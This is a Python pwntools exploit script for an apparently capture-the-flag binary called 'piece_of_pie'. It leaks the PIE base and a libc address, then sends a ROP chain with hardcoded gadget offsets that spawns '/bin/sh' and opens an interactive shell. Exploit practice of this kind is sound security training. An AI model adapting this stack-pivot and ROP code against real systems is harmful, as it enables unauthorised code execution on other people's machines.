#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template piece_of_pie
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'piece_of_pie')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        PIE enabled
# Stripped:   No

io = start()
# io = remote("localhost", 17171)


io.send(p64(0) + p64(0) + b"\xe2")
io.recvline()

base = int(io.recvline()[2:], 16) - exe.symbols["main"]

io.send(p64(0) + p64(base + 0x4200) + p64(base + exe.symbols["vuln"]+4))
print(hex(base))
io.send(p64(0) + p64(base + 0x4200) + p64(base + exe.symbols["ROP"]+4)+ p64(base+0x4000+8) + p64(base + exe.symbols["help"] + 71))
libc = int(io.recvline()[::-1].hex()[2:], 16) - 0x62e40
print(hex(libc))

io.send(b"/bin/sh\x00" + p64(base + 0x4250) + p64(libc + 0x000000000005acb5) + p64(0) + p64(libc + 0x00000000000f6642) + p64(0) + p64(libc+0xf6237))

io.interactive()

